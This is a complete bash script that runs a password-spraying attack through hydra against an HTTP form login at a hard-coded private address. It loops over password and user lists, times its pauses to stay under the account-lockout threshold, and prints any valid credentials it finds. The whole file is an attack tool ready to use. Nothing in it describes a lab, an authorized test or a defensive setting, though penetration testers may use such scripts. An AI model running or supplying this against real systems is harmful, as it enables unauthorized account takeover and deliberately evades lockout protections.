#!/bin/bash
cecho(){
    R="\033[1;31m"
    G="\033[0;32m"  # <-- [0 means not bold
    O="\033[1;33m" # <-- [1 means bold
    P="\033[1;35m"

    NC="\033[0m" # No Color

    echo -e "${!1}${2} ${NC}"
}

if ! command -v hydra &> /dev/null
then
    cecho "R" "hydra could not be found"
    exit 1
fi

########### CONFIGURATION #######################
#List
pwdlistF="pwd_lst.txt"
usrListF="users.txt"
#Account lockout threshold
alt=5
#Reset Account Lockout Counter After in seconds (900 == 15 minutes)
ralca=0
#Continue even valid credentials are found (0:stop, other values to continue)
avanti=0
###############################################

if [ ! -e "$pwdlistF" ]; then
    cecho "R" "$pwdlistF not found"
    exit 1
fi 

if [ ! -e "$usrListF" ]; then
    cecho "R" "$usrListF not found"
    exit 1
fi 

cTS=1

n_pwd=$(sed -n '$=' $pwdlistF)
n_usr=$(sed -n '$=' $usrListF)

#very aproximative time calculation: 1 second for each operation
a=$(($n_pwd*$n_usr))
#plus we need to consider the total waiting period in seconds
b=$(($a/$alt*$ralca))
#total time in seconds
c=$(($a+$b))
#convert seconds to hours
totH=$(($c/3600))

cecho "R" "The procedure will take approximately $totH hours to complite"
sleep 5


# we have found valid credentials
sex="successfully"

while IFS= read -r pwd
do
 
 cecho "G" "Spraying password $pwd [$cTS/$n_pwd]"
 
 while IFS= read -r usr
 do
 echo -e " |- Trying $usr"
 out=$(hydra 10.103.5.103 http-form-post "/form.php:name=^USER^&pwd=^PASS^:Failed" -l $usr -p $pwd -I)
 
 #check if success
 if [[ $out == *"$sex"* ]]; then
  echo "Found valid credentials"
  cecho "P" "$usr"
  cecho "P" "$pwd"
  if [ $avanti -eq 0 ]; then
   exit 0
  fi
 fi
 
 done < "$usrListF"
 
 #check thresold
 c=$(($cTS%alt))
 if (($c == 0)); then
      #wait now the reset period
      cecho "O" "Wait $(($ralca/60)) minutes for the Reset Account Lockout Counter After"
      sleep $ralca
  fi

  cTS=$(($cTS+1))

done < "$pwdlistF"
